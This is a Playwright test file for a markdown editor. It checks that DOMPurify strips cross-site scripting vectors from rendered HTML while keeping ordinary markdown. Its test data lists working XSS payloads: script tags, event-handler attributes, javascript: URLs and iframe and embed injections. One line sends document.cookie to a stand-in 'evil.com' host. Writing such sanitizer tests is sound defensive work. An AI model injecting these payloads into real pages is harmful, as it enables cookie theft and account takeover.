// SPDX-License-Identifier: AGPL-3.0-or-later
// Copyright (C) 2025 Mick Darling

// @ts-check
const { test, expect } = require('@playwright/test');
const {
  waitForPageReady,
  setCodeMirrorContent,
  renderMarkdownAndWait,
  WAIT_TIMES
} = require('./helpers/test-utils');

/**
 * XSS Prevention Tests
 *
 * Verifies that DOMPurify properly sanitizes HTML rendered from markdown,
 * blocking common XSS attack vectors while preserving safe content.
 *
 * Test vectors based on OWASP XSS Prevention Cheat Sheet and common payloads.
 *
 * Note: Test payloads containing 'javascript:' URLs are intentional XSS test vectors,
 * not actual code execution. SonarCloud rule S1523 flags these as potential RCE,
 * but they are safe test data strings that verify our sanitization works correctly.
 */

/**
 * Unified test case structure for both dangerous and safe content
 * @typedef {Object} ContentTestCase
 * @property {string} name - Descriptive name of the test case
 * @property {string} markdown - Markdown/HTML content to test
 * @property {string} type - 'dangerous' or 'safe'
 * @property {string[]} [shouldNotContain] - Strings that must NOT appear (for dangerous)
 * @property {string} [shouldContain] - String that MUST appear (for safe)
 */

/**
 * Combined test cases for content sanitization verification.
 * Dangerous payloads verify XSS vectors are blocked.
 * Safe content verifies normal markdown is preserved.
 * @type {ContentTestCase[]}
 */
const CONTENT_TEST_CASES = [
  // Dangerous: Script and document manipulation
  { name: 'script tag', type: 'dangerous', markdown: '# Hello\n<script>alert("XSS")</script>', shouldNotContain: ['<script', 'alert('] },
  { name: 'script tag with encoded content', type: 'dangerous', markdown: '<script>document.location="http://evil.com/steal?c="+document.cookie</script>', shouldNotContain: ['<script', 'document.location', 'document.cookie'] },

  // Dangerous: Event handlers
  { name: 'img onerror handler', type: 'dangerous', markdown: '<img src="x" onerror="alert(\'XSS\')">', shouldNotContain: ['onerror'] },
  { name: 'img onload handler', type: 'dangerous', markdown: '<img src="valid.jpg" onload="alert(\'XSS\')">', shouldNotContain: ['onload='] },
  { name: 'svg onload handler', type: 'dangerous', markdown: '<svg onload="alert(\'XSS\')"><circle r="50"/></svg>', shouldNotContain: ['onload'] },
  { name: 'body onload handler', type: 'dangerous', markdown: '<body onload="alert(\'XSS\')">', shouldNotContain: ['<body', 'onload'] },
  { name: 'div onclick handler', type: 'dangerous', markdown: '<div onclick="alert(\'XSS\')">Click me</div>', shouldNotContain: ['onclick'] },
  { name: 'anchor onmouseover', type: 'dangerous', markdown: '<a href="#" onmouseover="alert(\'XSS\')">Hover me</a>', shouldNotContain: ['onmouseover'] },
  { name: 'input onfocus', type: 'dangerous', markdown: '<input type="text" onfocus="alert(\'XSS\')" autofocus>', shouldNotContain: ['onfocus'] },
  { name: 'marquee tag with handler', type: 'dangerous', markdown: '<marquee onstart="alert(\'XSS\')">text</marquee>', shouldNotContain: ['onstart'] },
  { name: 'svg animate with values', type: 'dangerous', markdown: '<svg><animate onbegin="alert(\'XSS\')"/></svg>', shouldNotContain: ['onbegin'] },
  { name: 'foreignObject in SVG', type: 'dangerous', markdown: '<svg><foreignObject><body onload="alert(\'XSS\')"/></foreignObject></svg>', shouldNotContain: ['onload'] },

  // Dangerous: JavaScript URLs (test payloads - not executed, just verified as blocked)
  { name: 'javascript URL in anchor', type: 'dangerous', markdown: '[Click me](javascript:void(0))', shouldNotContain: ['javascript:'] },
  { name: 'javascript URL in img src', type: 'dangerous', markdown: '<img src="javascript:void(0)">', shouldNotContain: ['javascript:'] },
  { name: 'form action javascript', type: 'dangerous', markdown: '<form action="javascript:void(0)"><input type="submit"></form>', shouldNotContain: ['javascript:'] },
  { name: 'meta refresh redirect', type: 'dangerous', markdown: '<meta http-equiv="refresh" content="0;url=javascript:void(0)">', shouldNotContain: ['<meta', 'javascript:'] },
  { name: 'base tag hijack', type: 'dangerous', markdown: '<base href="javascript:void(0)//">', shouldNotContain: ['<base'] },
  { name: 'table background javascript', type: 'dangerous', markdown: '<table background="javascript:void(0)"><tr><td>test</td></tr></table>', shouldNotContain: ['javascript:'] },
  { name: 'video poster javascript', type: 'dangerous', markdown: '<video poster="javascript:void(0)"></video>', shouldNotContain: ['javascript:'] },
  { name: 'math tag with handler', type: 'dangerous', markdown: '<math><maction actiontype="statusline#http://evil.com" xlink:href="javascript:void(0)">text</maction></math>', shouldNotContain: ['javascript:', 'xlink:href'] },

  // Dangerous: Embedded content tags
  { name: 'data URL with script', type: 'dangerous', markdown: '<a href="data:text/html,<script>alert(1)</script>">Click</a>', shouldNotContain: ['data:text/html'] },
  { name: 'iframe injection', type: 'dangerous', markdown: '<iframe src="about:blank"></iframe>', shouldNotContain: ['<iframe'] },
  { name: 'iframe with srcdoc', type: 'dangerous', markdown: '<iframe srcdoc="<script>alert(1)</script>"></iframe>', shouldNotContain: ['<iframe', 'srcdoc'] },
  { name: 'object tag', type: 'dangerous', markdown: '<object data="about:blank"></object>', shouldNotContain: ['<object'] },
  { name: 'embed tag', type: 'dangerous', markdown: '<embed src="about:blank">', shouldNotContain: ['<embed'] },
  { name: 'link tag stylesheet injection', type: 'dangerous', markdown: '<link rel="stylesheet" href="http://evil.com/style.css">', shouldNotContain: ['<link'] },
  { name: 'svg script tag', type: 'dangerous', markdown: '<svg><script>alert("XSS")</script></svg>', shouldNotContain: ['<script'] },

  // Safe: Standard markdown elements that must be preserved
  { name: 'basic paragraph', type: 'safe', markdown: 'This is a paragraph.', shouldContain: '<p>This is a paragraph.</p>' },
  { name: 'heading with text', type: 'safe', markdown: '# My Heading', shouldContain: '<h1' },
  { name: 'safe link', type: 'safe', markdown: '[Safe Link](https://example.com)', shouldContain: 'href="https://example.com"' },
  { name: 'safe image', type: 'safe', markdown: '![Alt text](https://example.com/image.png)', shouldContain: 'src="https://example.com/image.png"' },
  { name: 'bold text', type: 'safe', markdown: '**bold text**', shouldContain: '<strong>bold text</strong>' },
  { name: 'italic text', type: 'safe', markdown: '*italic text*', shouldContain: '<em>italic text</em>' },
  { name: 'inline code', type: 'safe', markdown: '`code snippet`', shouldContain: '<code>code snippet</code>' },
  { name: 'blockquote', type: 'safe', markdown: '> This is a quote', shouldContain: '<blockquote>' },
  { name: 'unordered list', type: 'safe', markdown: '- Item 1\n- Item 2', shouldContain: '<ul>' },
  { name: 'ordered list', type: 'safe', markdown: '1. First\n2. Second', shouldContain: '<ol>' },
  { name: 'horizontal rule', type: 'safe', markdown: '---', shouldContain: '<hr' },
  { name: 'table', type: 'safe', markdown: '| Header |\n|--------|\n| Cell   |', shouldContain: '<table>' },
  { name: 'code block with class', type: 'safe', markdown: '```javascript\nconst x = 1;\n```', shouldContain: 'class="hljs' },
  { name: 'mailto link', type: 'safe', markdown: '[Email](mailto:test@example.com)', shouldContain: 'href="mailto:test@example.com"' }
];

/**
 * Helper to render markdown and get the wrapper HTML
 * @param {import('@playwright/test').Page} page - Playwright page
 * @param {string} markdown - Content to render
 * @returns {Promise<string>} Lowercase HTML content of the wrapper
 */
async function renderAndGetHtml(page, markdown) {
  await setCodeMirrorContent(page, markdown);
  await renderMarkdownAndWait(page, WAIT_TIMES.LONG);
  return page.$eval('#wrapper', el => el.innerHTML.toLowerCase());
}

/**
 * Helper to set up dialog listener for script execution tests
 * @param {import('@playwright/test').Page} page - Playwright page
 * @returns {{ wasTriggered: () => boolean }} Object with method to check if alert was triggered
 */
function setupDialogListener(page) {
  let alertTriggered = false;
  page.on('dialog', async dialog => {
    alertTriggered = true;
    await dialog.dismiss();
  });
  return { wasTriggered: () => alertTriggered };
}

// Filter test cases by type for organized test blocks
const dangerousTests = CONTENT_TEST_CASES.filter(tc => tc.type === 'dangerous');
const safeTests = CONTENT_TEST_CASES.filter(tc => tc.type === 'safe');

test.describe('XSS Prevention', () => {
  test.beforeEach(async ({ page }) => {
    await waitForPageReady(page);
  });

  test.describe('Blocks dangerous content', () => {
    for (const { name, markdown, shouldNotContain } of dangerousTests) {
      test(`should block XSS via ${name}`, async ({ page }) => {
        const wrapperHtml = await renderAndGetHtml(page, markdown);
        for (const forbidden of shouldNotContain) {
          expect(wrapperHtml, `"${forbidden}" should be stripped for ${name}`).not.toContain(forbidden.toLowerCase());
        }
      });
    }
  });

  test.describe('Preserves safe content', () => {
    for (const { name, markdown, shouldContain } of safeTests) {
      test(`should preserve ${name}`, async ({ page }) => {
        const wrapperHtml = await renderAndGetHtml(page, markdown);
        expect(wrapperHtml, `"${shouldContain}" should be present for ${name}`).toContain(shouldContain.toLowerCase());
      });
    }
  });

  test.describe('Prevents script execution', () => {
    test('should not execute inline script tags', async ({ page }) => {
      const listener = setupDialogListener(page);
      await renderAndGetHtml(page, '<script>alert("XSS")</script>');
      expect(listener.wasTriggered(), 'Script should not execute').toBe(false);
    });

    test('should not execute event handlers', async ({ page }) => {
      const listener = setupDialogListener(page);
      await renderAndGetHtml(page, '<img src="x" onerror="alert(\'XSS\')">');
      await page.waitForTimeout(500);
      expect(listener.wasTriggered(), 'Event handler should not execute').toBe(false);
    });

    test('should not execute javascript URLs on click', async ({ page }) => {
      const listener = setupDialogListener(page);
      // Using void(0) as a benign test payload instead of alert()
      await renderAndGetHtml(page, '<a href="javascript:void(0)" id="xss-link">Click me</a>');
      const link = await page.$('#wrapper a');
      if (link) {
        await link.click().catch(() => { /* Click may fail if href removed - expected */ });
      }
      await page.waitForTimeout(500);
      expect(listener.wasTriggered(), 'javascript: URL should not execute').toBe(false);
    });
  });

  test.describe('DOMPurify availability', () => {
    test('should have DOMPurify loaded globally', async ({ page }) => {
      const hasDOMPurify = await page.evaluate(() => {
        return typeof DOMPurify !== 'undefined' && typeof DOMPurify.sanitize === 'function';
      });
      expect(hasDOMPurify, 'DOMPurify should be available').toBe(true);
    });

    test('should sanitize HTML through DOMPurify.sanitize', async ({ page }) => {
      const result = await page.evaluate(() => {
        const dirty = '<script>alert("XSS")</script><p>Safe</p>';
        const clean = DOMPurify.sanitize(dirty);
        return { hasScript: clean.includes('<script'), hasParagraph: clean.includes('<p>Safe</p>') };
      });
      expect(result.hasScript, 'Script tag should be removed').toBe(false);
      expect(result.hasParagraph, 'Safe paragraph should be preserved').toBe(true);
    });
  });

  test.describe('Attribute preservation', () => {
    test('should preserve class attributes for syntax highlighting', async ({ page }) => {
      await renderAndGetHtml(page, '```python\nprint("hello")\n```');
      const hasClass = await page.$eval('#wrapper', el => {
        const code = el.querySelector('code');
        return code && code.classList.length > 0;
      });
      expect(hasClass, 'Code blocks should have class attributes').toBe(true);
    });

    test('should preserve id attributes for anchor links', async ({ page }) => {
      await renderAndGetHtml(page, '# Test Heading');
      const hasId = await page.$eval('#wrapper', el => {
        const h1 = el.querySelector('h1');
        return h1 && h1.hasAttribute('id');
      });
      expect(hasId, 'Headings should have id attributes').toBe(true);
    });
  });
});
